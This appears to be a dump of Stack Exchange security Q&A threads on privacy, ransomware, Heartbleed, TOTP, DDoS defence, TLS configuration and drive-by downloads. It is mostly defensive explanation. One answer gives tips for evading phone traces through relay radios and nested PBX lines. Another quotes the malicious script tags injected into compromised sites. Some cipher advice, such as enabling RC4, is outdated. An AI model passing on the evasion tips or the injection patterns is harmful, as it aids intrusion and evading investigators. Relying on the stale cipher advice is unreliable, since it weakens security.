<li>You must carefully balance your public and private personas. Give as little information as possible in your public persona, and be mindful that unknown entities who may be antagonistic toward you will look to use whatever you put online against you. For instance - you announce you're going to visit relatives for the weekend! Robbers and vandals may take notice (from Ars Technica:)</li>
</ul>

<blockquote>
  <p>39-year-old Candace Landreth and 44-year-old Robert Landreth Jr.
  allegedly used Facebook to see which of their friends were out of
  town. If a post indicated a Facebook friend wasn't home, the two broke
  into that friend's house and liberated some of their belongings.</p>
</blockquote>

<ul>
<li>Social media companies such as Facebook and Google have proven to be hostile to the notion of privacy, and <a href=""http://www.nbcbayarea.com/news/local/Google-To-Change-Privacy-Terms-227534471.html"">continually change</a> their terms of service and ""privacy settings"" without consent to share more and more of your information with others. You cannot rely on them to protect your public reputation from your personal life. From NBC:</li>
</ul>

<blockquote>
  <p>The Internet search giant is changing its terms of service starting
  Nov. 11. Your reviews of restaurants, shops and products, as well as
  songs and other content bought on the Google Play store could show up
  in ads that are displayed to your friends, connections and the broader
  public when they search on Google.</p>
  
  <p>The company calls that feature ""shared endorsements.''</p>
</blockquote>

<ul>
<li>It is best to offer information of a more personal nature pseudonymously, and keep the pseudonym(s) carefully firewalled from your real identity. Avoid major social media services when participating online pseudonymously if at all possible.</li>
</ul>
","46575"
"CryptoWall 3 - how to prevent and how to decrypt?","82313","","<p>My father's computer is now infected with CryptoWall 3, according to the link below.</p>

<p><a href=""http://www.bleepingcomputer.com/virus-removal/cryptowall-ransomware-information#CryptoWall"" rel=""nofollow noreferrer"">http://www.bleepingcomputer.com/virus-removal/cryptowall-ransomware-information#CryptoWall</a></p>

<p>Is there a way to decrypt the files? I will try to recover them but according to the link, the virus safe deletes the copies of the infected files.</p>

<p>What is the best way to prevent these kind of virus to infect our computers? Are there any way to prevent execution of unknown files? I was thinking about only allow execution permission on known files.</p>

<p><a href=""https://i.stack.imgur.com/F4ZFg.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/F4ZFg.jpg"" alt=""CryptoWall 3""></a></p>
","<p>First: there's no known way to decrypt files attacked by CryptoWall. Unless you pay to get the key, they are lost forever. If you don't have offline backups, your files are lost.</p>

<p>One way to prevent the execution of those kind of viruses is to <a href=""http://www.howtogeek.com/howto/8739/restrict-users-to-run-only-specified-programs-in-windows-7/?PageSpeed=noscript"">use whitelisting</a> on your Windows. This can be frustrating if your father does not know how to include applications on the whitelist, and will demand a lot of time to do right, but will deny execution of any application not known.</p>
","80893"
"How to trace a (mobile) phone?","82260","","<p>Even since growing up, I've watched films in which the ""bad guy"" is repeatedly tracked down when they call the police or FBI or police force de jour.  They always have ""about 30 seconds"".  Regardless of whether those specific realisations are accurate or not, I've never understood what is going on technically when a phone is traced.</p>

<p>This question has three related parts:</p>

<p>1) What are the technical aspects to tracing a phone call; is it more difficult for mobile phone?  Is it more difficult if the phone is on, but not actively being used to call?</p>

<p>2) Why are the tools necessary to trace phone calls not available to the general public?  We have traceroute to find routing information for IPs -- why not phones?  Is it a question of specialized equipment, access to telecomm systems, etc. or more social?</p>

<p>3) How does one prevent a (mobile) phone from being traced?</p>
","<blockquote>
  <p>What are the technical aspects to tracing a phone call; is it more difficult for mobile phone?</p>
</blockquote>

<p>In the old days, signaling was inline, hence the 2600hz hack. Calls were setup as one switch talked to another, then another, and so on until a circuit was established end-to-end. In the modern age, everything is out-of-band over SS7 and every switch is lined up at the same time. The calling station is identified at the start and no tracing is really necessary.</p>

<p>Mobile phones do take more effort because a mobile number isn't attached to a given switch. Thus, while the far end knows what the number is, where it is involves extra technology. The cellular phone company can identify what towers the phone is associated with and thus instantly know the region it is in. Further narrowing can be done based on signal strength comparisons, which of the tower's directional antennas are holding the signal, and GPS chips in phones.</p>

<blockquote>
  <p>Is it more difficult if the phone is on, but not actively being used to call?</p>
</blockquote>

<p>Only a custom phone would act in a way where it didn't respond to the tower asking a question, so generally no.</p>

<blockquote>
  <p>Why are the tools necessary to trace phone calls not available to the general public? We have traceroute to find routing information for IPs -- why not phones? Is it a question of specialized equipment, access to telecomm systems, etc. or more social?</p>
</blockquote>

<p>Social legacy and equipment access. The Internet doesn't have a separate signaling band and is based on the idea of independent operators controlling where their traffic goes. The phone company is based on the legacy of one company running the show. Switch access in the phone world is internal only to the phone company or whoever they want to specifically include. The Internet, on the other hand, doesn't really have a way of considering nodes special since everything is in the same band.</p>

<blockquote>
  <p>How does one prevent a (mobile) phone from being traced?</p>
</blockquote>

<p>Nothing will save you from being traced down to the tower you're using, but you can really screw around with the triangulation metrics by using a directional antenna and some weak false associations or intermediary transmission layer such a radio that links you to your phone. In that case, finding your phone would leave the person chasing you still lacking a physical connection and having to trace something else. Done right, you can turn the default, ""Within 100 feet,"" into, ""Somewhere in this 20 square mile cone."" That is a big time, knowledge, and equipment cost commitment, though.</p>

<p>You may also find some success in delaying tracing by using intermediate PBX systems to mask the actual caller. If you have dial-in access to a company's PBX, the trace will stop there and somebody will have to look at logs of associated calls into the system to try and correlate the responsible line. Nest a few of those and you may buy some time. You'll probably still eventually be traced no matter how short the call was, but it will no longer be instant.</p>
","12666"
"How can I verify that SSLv3 protocol is disabled?","81855","","<p>I'm trying to disable SSLv3 in ejabberd 2.1.10 on Ubuntu 12.04. There is no way to disable it in config file, so I have to patch the source and rebuild the package: <a href=""https://github.com/processone/ejabberd/issues/113"">https://github.com/processone/ejabberd/issues/113</a></p>

<p>The problem is after patching and installed, how can I verify that SSLv3 <strong>protocol</strong> is disabled? It is a private server, so I can't use <a href=""https://xmpp.net/"">https://xmpp.net/</a>.</p>

<p>I know we can use <code>openssl</code> with <code>-ssl3</code> option, something like this:</p>

<pre><code>openssl s_client -connect chat.local:5222 -starttls xmpp -ssl3
</code></pre>

<p>but the thing is: I cannot disable SSLv3 <strong>cipher suites</strong>: <a href=""https://github.com/processone/ejabberd/issues/113#issuecomment-29279707"">https://github.com/processone/ejabberd/issues/113#issuecomment-29279707</a>:</p>

<blockquote>
  <p>Please note that while you can disable SSL version 3, you cannot disable ""SSLv3 cipher suites"" as there is no such thing, all SSLv3 cipher suites are used also by all TLS versions (TLS 1.1/1.2 just adds some new ones).</p>
</blockquote>

<p>so the above command still shows the result:</p>

<pre><code>New, TLSv1/SSLv3, Cipher is AES256-SHA
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
SSL-Session:
    Protocol  : SSLv3
    Cipher    : AES256-SHA
    Session-ID:
    Session-ID-ctx:
    Master-Key: D1D474B68F6C4F59ED5E96963F94FAF078A0C5531A7841B1E0E34257925309A96EA2F25F59F65CCD151F05EB75BC935C
    Key-Arg   : None
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    Start Time: 1414072098
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
</code></pre>

<p>Two questions: </p>

<ol>
<li>how can a online ssl checker (<a href=""https://www.ssllabs.com/ssltest/"">https://www.ssllabs.com/ssltest/</a>, <a href=""https://xmpp.net/"">https://xmpp.net/</a>, ...) can test if SSLv3 <strong>protocol</strong> is disabled or not?</li>
<li>Is there any risk if SSLv3 protocol is disabled, but SSLv3 cipher suites enabled for some reasons (for e.g OpenSSL on Ubuntu 12.04 disabled TLSv1.2, we have to enable SSLv3 cipher suites to make some monitoring tool worked)?</li>
</ol>
","<pre><code>SSL-Session:
   Protocol  : SSLv3
   Cipher    : AES256-SHA
</code></pre>

<p>Obviously your server still has SSLv3 enabled.
If you successfully disabled SSLv3 <code>openssl s_client -ssl3 -connect ...</code> should get something like this:</p>

<pre><code>...SSL3_READ_BYTES:sslv3 alert handshake failure:s3_pkt.c:1260:SSL alert number 40
...SSL3_WRITE_BYTES:ssl handshake failure:s3_pkt.c:596:
...
Protocol  : SSLv3
Cipher    : 0000
</code></pre>

<p>The indicator here is that you get no cipher (""0000"").</p>

<p>As for the ciphers itself you don't need to make any changes. </p>
","71459"
"How exactly does the OpenSSL TLS heartbeat (Heartbleed) exploit work?","81541","","<p>I've been hearing more about the <a href=""http://heartbleed.com/"">OpenSSL Heartbleed attack</a>, which exploits some flaw in the heartbeat step of TLS. If you haven't heard of it, it allows people to:</p>

<ul>
<li>Steal OpenSSL private keys</li>
<li>Steal OpenSSL secondary keys</li>
<li>Retrieve up to 64kb of memory from the affected server </li>
<li>As a result, decrypt all traffic between the server and client(s)</li>
</ul>

<p>The commit to OpenSSL which fixes this issue is <a href=""http://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=96db9023b881d7cd9f379b0c154650d6c108e9a3"">here</a> </p>

<p>I'm a bit unclear - everything I've read contains information about what one should do about it, but not how it works. So, how does this attack work?</p>
","<p>This is <em>not</em> a flaw in TLS; it is a simple memory safety bug in OpenSSL.</p>

<p>The best explanations I've run across so far are the blog posts <a href=""https://www.seancassidy.me/diagnosis-of-the-openssl-heartbleed-bug.html"" rel=""nofollow noreferrer"">Diagnosis of the OpenSSL Heartbleed Bug</a> by Sean Cassidy and <a href=""https://blog.cryptographyengineering.com/2014/04/08/attack-of-the-week-openssl-heartbleed/"" rel=""nofollow noreferrer"">Attack of the week: OpenSSL Heartbleed</a> by Matthew Green.</p>

<p>In short, Heartbeat allows one endpoint to go ""I'm sending you some data, echo it back to me"". You send both a length figure and the data itself. The length figure can be up to 64 KiB. Unfortunately, if you use the length figure to <em>claim</em> ""I'm sending 64 KiB of data"" (for example) and then only <em>really</em> send, say, one byte, OpenSSL would send you back your one byte -- and 64 KiB (minus one) of other data from RAM.</p>

<p>Whoops!</p>

<p>This allows the other endpoint to get random portions of memory from the process using OpenSSL. An attacker cannot choose <em>which</em> memory, but if they try enough times, their request's data structure is likely to wind up next to something interesting, such as your private keys, or users' cookies or passwords.</p>

<p>None of this activity will be logged anywhere, unless you record, like, all your raw TLS connection data.</p>

<p>Not good.</p>

<p><img src=""https://i.stack.imgur.com/fA4a4.png"" alt=""https://xkcd.com/1354/""></p>

<p><a href=""https://xkcd.com/1354/"" rel=""nofollow noreferrer"">The above xkcd comic</a> does a nice job illustrating the issue.</p>

<hr>

<p>Edit: I wrote in a comment below that the heartbeat messages are encrypted. This is not always true. You can send a heartbeat early in the TLS handshake, before encryption has been turned on (though you're not supposed to). In this case, both the request and response will be unencrypted. In normal usage, heartbeats ought to always be sent later, encrypted, but most exploit tools will probably not bother to complete the handshake and wait for encryption. (Thanks, RedBaron.)</p>
","55117"
"How does Google Authenticator work?","80948","","<p>Google Authenticator is an alternative to SMS for 2Step verification, installing an app on Android where the codes will be sent.</p>

<p>It works without any connectivity; it even works on plane mode. This is what I don't get. How is it possible that it works without connectivity? How do the mobile phone and the server sync to know which code is valid at that very moment?</p>
","<p>Google Authenticator supports both the <a href=""http://en.wikipedia.org/wiki/HMAC-based_One-time_Password_Algorithm"">HOTP</a> and <a href=""http://en.wikipedia.org/wiki/Time-based_One-time_Password_Algorithm"">TOTP</a> algorithms for generating one-time passwords.</p>

<p>With HOTP, the server and client share a secret value and a counter, which are used to compute a one time password independently on both sides. Whenever a password is generated and used, the counter is incremented on both sides, allowing the server and client to remain in sync.</p>

<p>TOTP essentially uses the same algorithm as HOTP with one major difference. The counter used in TOTP is replaced by the current time. The client and server remain in sync as long as the system times remain the same. This can be done by using the <a href=""http://en.wikipedia.org/wiki/Network_Time_Protocol"">Network Time protocol</a>.</p>

<p>The secret key (as well as the counter in the case of HOTP) has to be communicated to both the server and the client at some point in time. In the case of Google Authenticator, this is done in the form of a QRCode encoded URI. See: <a href=""https://code.google.com/p/google-authenticator/wiki/KeyUriFormat"">KeyUriFormat</a> for more information.</p>
","35159"
"Are passwords stored in memory safe?","80073","","<p>I just realized that, in any language, when you save a password in a variable, it is stored as plain text in the memory.</p>

<p>I think the OS does its job and forbids processes from accessing each other's allocated memory. But I also think this is somehow bypassable. So I wonder if it is really safe and if there is a safer way to store passwords to ensure that foreign processes can't access them.</p>

<p>I didn't specify the OS or the language because my question is quite general. This is rather a computer literacy question than a specific purpose one.</p>
","<p>You are touching a sore point...</p>

<p><strong>Historically</strong>, computers were <em>mainframes</em> where a lot of distinct users launched sessions and process on the same physical machine. Unix-like systems (e.g. Linux), but also VMS and its relatives (and this family includes all Windows of the NT line, hence 2000, XP, Vista, 7, 8...), have been structured in order to support the mainframe model.</p>

<p>Thus, the hardware provides <em>privilege levels</em>. A central piece of the operating system is the <strong>kernel</strong> which runs at the highest privilege level (yes, I know there are subtleties with regards to virtualization) and <em>manages</em> the privilege levels. Applications run at a lower level and are forcibly prevented by the kernel from reading or writing each other's memory. Applications obtain RAM by <em>pages</em> (typically 4 or 8 kB) from the kernel. An application which tries to access a page belonging to another application is blocked by the kernel, and severely punished (""segmentation fault"", ""general protection fault""...).</p>

<p>When an application no longer needs a page (in particular when the application exits), the kernel takes control of the page and may give it to another process. Modern operating systems ""blank"" pages before giving them back, where ""blanking"" means ""filling with zeros"". This prevents leaking data from one process to another. Note that Windows 95/98/Millenium did <em>not</em> blank pages, and leaks could occur... but these operating system were meant for a single user per machine.</p>

<p>Of course, there are ways to escape the wrath of the kernel: a few doorways are available to applications which have ""enough privilege"" (not the same kind of privileges than above). On a Linux system, this is <a href=""http://linux.die.net/man/2/ptrace"" rel=""noreferrer"">ptrace()</a>. The kernel allows one process to read and write the memory of the other, through ptrace(), provided that both processes run under the same user ID, or that the process which does the ptrace() is a ""root"" process. Similar functionality exists in Windows.</p>

<p><strong>The bottom-line is that passwords in RAM are no safer than what the operating system allows.</strong> By definition, by storing some confidential data in the memory of a process, you are trusting the operating system for not giving it away to third parties. The OS is your <em>friend</em>, because if the OS is an enemy then you have utterly lost.</p>

<hr />

<p>Now comes the fun part. Since the OS enforces a separation of process, many people have tried to find ways to pierce these defenses. And they found a few interesting things...</p>

<ul>
<li><p>The ""RAM"" which the applications see is not necessarily true ""memory"". The kernel is a master of illusions, and gives pages that do not necessarily exist. The illusion is maintained by swapping RAM contents with a dedicated space on the disk, where free space is present in larger quantities; this is called <a href=""http://en.wikipedia.org/wiki/Virtual_memory"" rel=""noreferrer"">virtual memory</a>. Applications need not be aware of it, because the kernel will bring back the pages when needed (but, of course, disk is much slower than RAM). An unfortunate consequence is that some data, purportedly held in <em>RAM</em>, makes it to a physical medium where it will stay until overwritten. In particular, it will stay there if the power is cut. This allows for attacks where the bad guy grabs the machine and runs away with it, to inspect the data later on. Or leakage can occur when a machine is decommissioned and sold on eBay, and the sysadmin forgot to wipe out the disk contents.</p>

<p>Linux provides a system called called <a href=""http://linux.die.net/man/2/mlock"" rel=""noreferrer"">mlock()</a> which prevents the kernel from sending some specific pages to the swap space. Since locking pages in RAM can deplete available RAM resources for other process, you need some privileges (root again) to use this function.</p>

<p>An aggravating circumstance is that it is not necessarily easy to keep track of where your password is really in RAM. As a programmer, you access RAM through the abstraction provided by the programming language. In particular, programming languages which use <a href=""http://en.wikipedia.org/wiki/Garbage_collection_%28computer_science%29"" rel=""noreferrer"">Garbage Collection</a> may transparently copy objects in RAM (because it really helps for many GC algorithms). Most programming languages are thus impacted (e.g. Java, C#/.NET, Javascript, PHP,... the list is almost endless).</p></li>
<li><p><a href=""http://en.wikipedia.org/wiki/Hibernation_%28computing%29"" rel=""noreferrer"">Hibernation</a> brings back the same issues, with a vengeance. By nature, hibernation must write the whole RAM to the disk -- this <a href=""https://stackoverflow.com/a/41524790/952234"">may</a> include pages which were mlocked, and even the contents of the CPU registers. To avoid leaks through hibernation, you have to resort to drastic measures like encrypting the whole disk -- this naturally implies typing the unlock password whenever you awake the machine.</p></li>
<li><p>The mainframe model assumes that it <em>can</em> run several process which are hostile to each other, and yet maintain perfect peace and isolation. Modern hardware makes that very difficult. When two process run on the same CPU, they share some resources, including cache memory; memory accesses are much faster in the cache than elsewhere, but cache size is very limited. This has been exploited to <a href=""http://www.daemonology.net/papers/htt.pdf"" rel=""noreferrer"">recover cryptographic keys</a> used by one process, from another. Variants have been developed which use other cache-like resources, e.g. branch prediction in a CPU. While research on that subject concentrates on cryptographic keys, which are <em>high-value secrets</em>, it could really apply to just any data.</p>

<p>On a similar note, video cards can do <a href=""http://en.wikipedia.org/wiki/Direct_memory_access"" rel=""noreferrer"">Direct Memory Access</a>. Whether DMA cannot be abused to read or write memory from other process depends on how well undocumented hardware, closed-source drivers and kernels collaborate to enforce the appropriate access controls. I would not bet my last shirt on it...</p></li>
</ul>

<hr />

<p><strong>Conclusion:</strong> yes, when you store a password in RAM, you are trusting the OS for keeping that confidential. Yes, the task is hard, even nigh impossible on modern systems. If some data is highly confidential, you really should not use the mainframe model, and not allow potentially hostile entities to run their code on your machine.</p>

<p>(Which, by the way, means that hosted virtual machines and cloud computing cannot be ultimately safe. If you are serious about security, use dedicated hardware.)</p>
","29023"
"How do major sites prevent DDoS?","79825","","<p>As far as I know, I have never heard of or seen any large scale web sites like Amazon, Microsoft, Apple, Google, or Ebay ever suffer from DDoS. Have you? </p>

<p>I have a personal philosophy that the bigger you are, the more of a target you are for such attacks. Imagine the brownie points you would get if you could bring down a major website. </p>

<p>Yet, such sites have always remained sturdy and seemly invincible. What security measures have they implemented and can these be applied to smaller businesses?</p>
","<p>They generally have a very layered approach. Here are some things I've either implemented or seen implemented at large organizations. To your specific question on smaller businesses you generally would find a 3rd party provider to protect you. Depending on your use case this may be a cloud provider, a CDN, a BGP routed solution, or a DNS-based solution. </p>

<p><strong>Bandwidth Oversubscription</strong> - This one is fairly straightforward. As you grow larger, your bandwidth costs drop. Generally large organizations will lease a significantly larger capacity than they need to account for growth and DDoS attacks. If an attacker is unable to muster enough traffic to overwhelm this, a volumetric attack is generally ineffective. </p>

<p><strong>Automated Mitigation</strong> - Many tools will monitor netflow data from routers and other data sources to determine a baseline for traffic. If traffic patterns step out of these zones, DDoS mitigation tools can attract the traffic to them using BGP or other mechanisms and filter out noise. They then pass the clean traffic further into the network. These tools can generally detect both volumetric attacks, and more insidious attacks such as slowloris. </p>

<p><strong>Upstream Blackholing</strong> - There are ways to filter UDP traffic using router blackholing. I've seen situations where a business has no need to receive UDP traffic (i.e. NTP and DNS) to their infrastructure, so they have their transit providers blackhole all of this traffic. The largest volumetric attacks out there are generally reflected NTP or DNS amplification attacks.</p>

<p><strong>Third Party Provider</strong> - Even many fairly large organizations fear that monster 300 Gbps attack. They often implement either a DNS-based redirect service or a BGP-based service to protect them in case they suffer a sustained attack. I would say CDN providers also fall under this umbrella, since they can help an organization stay online during an attack.</p>

<p><strong>System Hardening</strong> - You can often configure both your operating system and your applications to be more resilient to application layer DDoS attacks. Things such as ensuring enough inodes on your Linux server to configuring the right number of Apache worker threads can help make it harder for an attacker to take down your service. </p>
","73371"
"""Optimal"" Web Server SSL Cipher Suite Configuration","79769","","<p>Over the last couple of years there have been a number of changes in what would be considered an optimal SSL cipher suite configuration (e.g. the BEAST and CRIME attacks, the weaknesses in RC4)</p>

<p>My question is, what would currently be considered an optimal set of SSL cipher suites to have enabled with the following goals.</p>

<ul>
<li>Provide the most secure connection possible, including where possible Perfect Forward Security and avoiding known weaknesses.</li>
<li>Provide compatibility with a wide range of commonly deployed clients including mobile devices (e.g. Android, iOS, Windows Phone) and desktop OS (including Windows XP/IE6)</li>
</ul>
","<p>The most secure setup doesn't depend only on ciphers, but also on the tls-version used. For openssl, tls 1.1/1.2 is preferred. BEAST and CRIME are attacks on the client and are usually mitigated client-side, but there are server-side mitigations too:</p>

<ul>
<li>CRIME: just disable ssl-compression; that's it </li>
<li>BEAST/Lucky13: just use TLS 1.1, no SSLv3 and no RC4, see <a href=""https://community.qualys.com/blogs/securitylabs/2013/09/10/is-beast-still-a-threat"">Is BEAST Still a Threat? (Ivan Ristic)</a></li>
<li>BREACH: works only, if some conditions are met, see <a href=""http://breachattack.com/#mitigations"">breachattack.com</a>; easy and always-working mitigation would be to disbale http-compression (gzip)</li>
</ul>

<p>For a perfect setup: SSL always impacts performance on a high level, RC4 and other fast cipher-suites might still be ok for static content, esp. when served from your own cdn. </p>

<p>A nice guide to understanding OpenSSL is <a href=""https://community.qualys.com/blogs/securitylabs/2013/10/08/openssl-cookbook-v11-released"">OpenSSL Cookbook</a> with detailed explanations also on <a href=""http://en.wikipedia.org/wiki/Forward_secrecy"">PFS</a>, cipher-suites, tls-version etc. pp. there are 2 blogposts that explains PFS and practical setup:</p>

<ul>
<li><a href=""https://community.qualys.com/blogs/securitylabs/2013/06/25/ssl-labs-deploying-forward-secrecy"">SSL Labs: Deploying Forward Secrecy</a></li>
<li><a href=""https://community.qualys.com/blogs/securitylabs/2013/08/05/configuring-apache-nginx-and-openssl-for-forward-secrecy"">Configuring Apache, Nginx, and OpenSSL for Forward Secrecy</a></li>
</ul>

<p>cipher-suites-suggestions to enable PFS also on older clients:</p>

<pre><code># apache
SSLProtocol all -SSLv2 -SSLv3
SSLHonorCipherOrder on
SSLCipherSuite ""EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384 \
EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH+aRSA+RC4 \
EECDH EDH+aRSA RC4 !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS""

# nginx

ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
ssl_prefer_server_ciphers on;
ssl_ciphers ""EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384 \
EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH+aRSA+RC4 \
EECDH EDH+aRSA RC4 !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS"";
</code></pre>

<p>For a detailed nginx/ssl-manual I'd like to direct you to this <a href=""https://www.mare-system.de/guide-to-nginx-ssl-spdy-hsts/"">Guide to Nginx + SSL + SPDY</a>.</p>
","51730"
"How dangerous is it to reveal your date of birth, and why?","79538","","<p>At some point I told a friend that it's dangerous to reveal your birth date (kind of like your social security number or your mother's maiden name), because it's a crucial piece of information for identity theft. However, I'm not sure <em>what exactly</em> an identity thief could do if the <strong>only</strong> non-public information he had about me was my birth date. (I'd consider my name, and probably my address, to be public here.)</p>

<p>How and why exactly is revealing your birth date <em>itself</em> dangerous?  </p>

<p>Note that I'm <strong>not</strong> asking why knowing it in <em>combination</em> with other personal information (e.g. SSN) can be dangerous. I'm asking why even knowing it in isolation is dangerous.
What kinds of things could an ID thief do with just with my birth date? Can he, for example, open a bank account? Recover a bank password? Open a credit card? Take a car loan? etc.</p>

<p>(I'm assuming the country is the United States of America.)</p>
","<p>The problem with revealing your birthday isn't the birthday itself, it is that you are giving people one more data point.</p>

<p>Reveal your birthday on site A, your relatives on site B (which gives for example mother's maiden name), your address on site C...before you know it people are able to pull together a huge amount of compiled information.</p>

<p>That information can then be used to hack things, either directly using password reset forms, guessing passwords, etc, or indirectly through spear phishing attacks.</p>

<p>For example a birthday message from an old school friend that arrives on your birthday and comes from their name would be much more convincing than a random email with a link saying ""click this"".</p>
","95070"
"Can a hacker sniff others' network data over a wireless connection?","78934","","<p>Provided that the hacker knows the WiFi password if any (WEP or WPA), is he capable of sniffing network data of other hosts connected to the same access point?</p>
","<p>If an attacker has the password, then they could, for example, use <a href=""http://wiki.wireshark.org/HowToDecrypt802.11"">Wireshark to decrypt the frames</a>.  </p>

<p>(Note, however, there's no need to have a WEP password since it is a completely broken security algorithm. WEP keys can be extracted from the encrypted traffic by <a href=""http://www.speedguide.net/articles/how-to-crack-wep-and-wpa-wireless-networks-2724"">merely capturing enough packets</a>.  This usually only takes a few minutes.</p>

<p>Also, keep in mind that not all APs are built the same.  Some can <a href=""http://www.securityinfowatch.com/blog/10474975/wireless-beamforming-is-so-cool"">direct the RF beam</a> in a much more focused way. Therefore, although you may be connected to the same AP, you may not be able to see all of the other traffic.)</p>
","12602"
"How is the ""WannaCry"" Malware spreading and how should users defend themselves from it?","78519","","<p>There's a new strain of attacks which is affecting a lot of systems around the world (including the NHS in the UK and Telefonica in Spain) which is being called <a href=""https://www.grahamcluley.com/wannacry-ransomware-hits-systems-worldwide/"" rel=""noreferrer"">""WannaCry""</a> amongst other names.</p>

<p>It seems to be a both a standard phishing/ransomware attack but it's also spreading like a worm once it gets into a target network.</p>

<p>How is this malware compromising people's systems and what's the best way for people to protect themselves from this attack?</p>
","<p>WannaCry attacks are initiated using an <strong>SMBv1</strong> remote code execution vulnerability in Microsoft Windows OS. The <a href=""https://en.wikipedia.org/wiki/EternalBlue"" rel=""noreferrer"">EternalBlue</a> exploit has been patched by Microsoft on March 14 and made publicly available through the ""Shadowbrokers dump"" on April 14th, 2017. However, many companies and public organizations have not yet installed the patch to their systems. The Microsoft patches for legacy versions of Windows were released last week after the attack.</p>

<p><strong>How to prevent WannaCry infection?</strong></p>

<ol>
<li><p>Make sure that all hosts have enabled endpoint anti-malware solutions.</p></li>
<li><p>Install the official Windows patch (MS17-010) <a href=""https://technet.microsoft.com/en-us/library/security/ms17-010.aspx"" rel=""noreferrer"">https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</a>, which closes the SMB Server vulnerability used in this ransomware attack.</p></li>
<li><p>Scan all systems. After detecting the malware attack as MEM:Trojan.Win64.EquationDrug.gen, reboot the system. Make sure MS17-010  patches are installed.</p></li>
<li><p>Backup all important data to an external hard drive or cloud storage service.</p></li>
</ol>

<p>More information here: <a href=""https://malwareless.com/wannacry-ransomware-massively-attacks-computer-systems-world/"" rel=""noreferrer"">https://malwareless.com/wannacry-ransomware-massively-attacks-computer-systems-world/</a></p>
","159337"
"Can you get virus just by visiting a website in Chrome?","78082","","<p>I've recently read <a href=""https://web.archive.org/web/20090108080040/http://www.straightsectalk.com/?p=47"" rel=""nofollow noreferrer"">Google Chrome: The End of Drive-By Downloads</a>. Is it true to say that drive-by-downloads are history in Google Chrome?</p>

<p>So if I have a link (from a spam email) I can right-click >> <code>open in new incognito window</code> >> and be 100% sure that there is no virus / damage to my system?</p>

<p>Initially i've asked this question at <a href=""https://webapps.stackexchange.com/questions/15209/anonymous-links-in-email/15211"">https://webapps.stackexchange.com/questions/15209/anonymous-links-in-email/15211</a> but I'm not getting a good answer (and besides the answers are all targeted at phishing-sites whereas my question is targeted at ""virus-sites"").</p>
","<p>It is admitted that drive-by download attacks occur only thanks to the user's interaction as it was the case, for instance, with the <a href=""http://www.bleepingcomputer.com/virus-removal/remove-hdd-plus"">HDD Plus</a> virus where visitors of the compromised website needed to double click at least on rad.msn.com banners.</p>

<p>But actually there have been drive-by download attacks that run successfully on IE, Safari, Chrome and Firefox without requiring the user's interaction. 
For instance, <a href=""https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0611"">CVE-2011-0611</a> was a 0-day vulnerability up to April 13th, 2011 (meaning a short while before you asked this question). It was used to infect the homepage of the Human Right Watch website in UK. <a href=""http://blog.armorize.com/2011/04/newest-adobe-flash-0-day-used-in-new.html"">The infected page</a> contains a rogue <code>&lt;script src=newsvine.jp2&gt;&lt;/script&gt;</code> element. This tricks the browser into caching and executing <code>newsvine.jp2</code> as JavaScript code. It was a drive-by cache attack which is just a case of drive-by download attacks. The caching is successful, but the file cannot be executed as JavaScript because it is actually a renamed malicious executable corresponding to a backdoor from the <a href=""http://www.enigmasoftware.com/trojanpincavaamj-removal/"">pincav</a> family.</p>

<p>Another rogue script element found on the infected page is <code>&lt;script src=""/includes/googlead.js""&gt;&lt;/script&gt;</code>, which unlike most drive-by download attacks, loads a local <code>.js</code> file. The JavaScript code in <code>googlead.js</code> creates an iframe that executes the SWF exploit from a domain controlled by the attackers.</p>

<p>By the same year you asked this question, there was an other example of a drive-by download attack of which no browser was safe as long as they run a vulnerable version of JRE at that time (<a href=""https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-3544"">CVE-2011-3544</a>). Thousands of visitors of the Amnesty International's homepage in UK were thus infected by <a href=""https://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/Troj~Spy-XR/detailed-analysis.aspx"">Trojan Spy-XR</a> malware. The attacks continued <a href=""http://www.krebsonsecurity.com/2011/12/amnesty-international-site-serving-java-exploit/"">until June 2011</a>, so later after you asked this question: Google Chrome was not safe of it.</p>

<p>A little bit more than two years later after this question, on <a href=""http://php.net/archive/2013.php#id2013-10-24-1"">October 24th, 2013</a>, the famous <code>php.net</code> website has been infecting its visitors by a drive-download attack through a hidden <em>iframe</em> tag. The attack concerned also Google Chrome.</p>

<p>Also you mentioned Google Chrome could be that safe because of its sandbox mechanism: well, all browsers are sandboxed, not only Google Chrome, but still they are vulnerable to drive by download attacks because of their own vulnerabilities or those of the plugins installed within them.</p>
","96953"
"How safe is the 256-bit encryption used in bank transactions?","77449","","<p>Most of the banks use a 128-bit or 256-bit encryption. What does this mean? Does it mean that the keys used in SSL are 128-bit long or what?</p>

<p>If they are the SSL key lengths then 128 bit RSA keys are easy to decrypt. The rsa site itself recommends keys having length of 1024 bits or more.</p>
","<p>You can pretty much ignore the statements about 128 and 256 bits.  It is a marketing statement intended to sound impressive, but really it just means that they are using SSL in a not-totally-stupid way. </p>

<p>(It means the symmetric-key cipher is using a 128-bit or 256-bit key.  This ensures that the symmetric cipher is not the weakest link in the chain.  However since the symmetric cipher is not the weakest link in the chain, the risks will be primarily elsewhere, so you shouldn't get too caught up in the meaning of 128- or 256-bit strength.  This just means that they haven't chosen a stupid configuration that makes the symmetric key readily breakable.  It does not mean that the RSA key is 128 bits or 256 bits; as you say, a 128-bit or 256-bit RSA key would be totally insecure.)</p>

